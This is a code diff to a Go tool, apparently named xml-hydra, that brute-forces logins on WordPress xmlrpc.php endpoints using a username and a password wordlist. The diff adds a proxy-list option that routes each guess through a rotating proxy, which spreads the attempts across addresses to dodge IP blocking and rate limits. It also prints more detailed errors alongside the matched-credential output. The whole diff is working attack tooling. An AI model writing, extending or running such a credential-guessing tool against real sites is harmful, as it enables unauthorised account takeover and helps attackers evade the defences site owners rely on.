@@ -38,6 +38,7 @@ OPTIONS:
  -u    Username
  -w    Wordlist for passwords
  -g    Number of goroutines to execute at a time (Default=4)
+ -P    Proxy list
  -h    Shows help message
 
 EXAMPLE:  xml-hydra -t https://example.com/xmlrpc.php -u username -w passwords.txt
@@ -49,6 +50,7 @@ var (
 	wordlist  string
 	gnum      int
 	help      bool
+	proxyList string
 	re        = regexp.MustCompile(`(<name>isAdmin<\/name>)`)
 )
 
@@ -57,6 +59,7 @@ func argParse() {
 	flag.StringVar(&username, "u", "", "Username")
 	flag.StringVar(&wordlist, "w", "", "Wordlist for passwords")
 	flag.IntVar(&gnum, "g", 4, "Number of goroutines to execute at a time (Default=4)")
+	flag.StringVar(&proxyList, "P", "", "Proxy list")
 	flag.BoolVar(&help, "h", false, "Shows help message")
 
 	flag.Parse()
@@ -103,9 +106,9 @@ func main() {
 
 	for r := range resCh {
 		if r.Error != nil {
-			fmt.Printf("[!] Error checking (%s:%s)", r.Request.Username, r.Request.Password)
+			fmt.Printf("\n[!] Error checking (%s:%s)\n%s", r.Request.Username, r.Request.Password, r.Error)
 		} else if r.Match {
-			fmt.Printf("[+] Matched -> %s:%s\n", r.Request.Username, r.Request.Password)
+			fmt.Printf("\n[+] Matched -> %s:%s\n", r.Request.Username, r.Request.Password)
 			break
 		}
 		bar.Add(1)
@@ -113,12 +116,26 @@ func main() {
 }
 
 func CreateRequests(url, username string, passwords []string, ch chan<- Request) {
-	for _, pw := range passwords {
-		ch <- Request{
-			URL:      url,
-			Username: username,
-			Password: pw,
-			ProxyURL: "",
+	if proxyList == "" {
+		for _, pw := range passwords {
+			ch <- Request{
+				URL:      url,
+				Username: username,
+				Password: pw,
+				ProxyURL: "",
+			}
+		}
+	} else {
+		pp := NewProxyPool(ReadFileLines(proxyList))
+		proto := strings.Split(targetUrl, "://")[0]
+		for _, pw := range passwords {
+			pUrl := fmt.Sprintf("%s://%s", proto, pp.GetItem())
+			ch <- Request{
+				URL:      url,
+				Username: username,
+				Password: pw,
+				ProxyURL: pUrl,
+			}
 		}
 	}
 	close(ch)
